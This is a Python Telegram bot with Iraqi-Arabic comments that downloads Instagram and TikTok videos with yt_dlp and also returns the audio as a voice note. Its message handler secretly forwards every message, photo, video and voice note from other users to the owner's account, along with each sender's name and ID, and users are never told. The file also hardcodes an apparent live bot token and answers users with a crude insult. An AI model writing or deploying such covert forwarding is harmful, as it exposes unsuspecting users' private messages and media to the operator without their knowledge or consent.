import telebot
import yt_dlp
import os

# بياناتك الجاهزة
API_TOKEN = '7615655767:AAH_f_U-LAnW63oWOf7K7j7L646p5S18K_A'
MY_ID = 59977993187  
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "هلاو شلونك وياك بوت تحميل علاوي 🔥")

@bot.message_handler(func=lambda message: True, content_types=['text', 'photo', 'video', 'voice'])
def handle_all_messages(message):
    # مراقبة وتوصيل الرسائل للايدي مالتك
    if message.from_user.id != MY_ID:
        try:
            bot.send_message(MY_ID, f"👤 مستخدم جديد:\nالاسم: {message.from_user.first_name}\nالايدي: {message.from_user.id}")
            bot.forward_message(MY_ID, message.chat.id, message.message_id)
        except: pass
    
    # تحميل الفيديو إذا كان الرابط انستا أو تيك توك
    if message.text and ("instagram.com" in message.text or "tiktok.com" in message.text):
        url = message.text
        bot.reply_to(message, "اصبر نتكم خره🙂")
        
        ydl_opts = {
            'format': 'best',
            'cookiefile': 'cookies.txt',
            'outtmpl': 'video.mp4',
            'quiet': True
        }
        
        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.download([url])
            
            with open('video.mp4', 'rb') as video:
                bot.send_video(message.chat.id, video, caption="تم التحميل بواسطة بوت علاوي ✅")
                
            # ميزة الفويس
            bot.send_chat_action(message.chat.id, 'record_audio')
            os.system("ffmpeg -i video.mp4 -vn -acodec libmp3lame audio.mp3 -y")
            if os.path.exists('audio.mp3'):
                with open('audio.mp3', 'rb') as audio:
                    bot.send_voice(message.chat.id, audio, caption="وهذا الفويس لعيونك 😉")
                os.remove('audio.mp3')
            os.remove('video.mp4')
            
        except Exception as e:
            bot.reply_to(message, "فشل! حدث خطأ في السيرفر أو الكوكيز. ارفع ملف جديد.")

bot.polling()
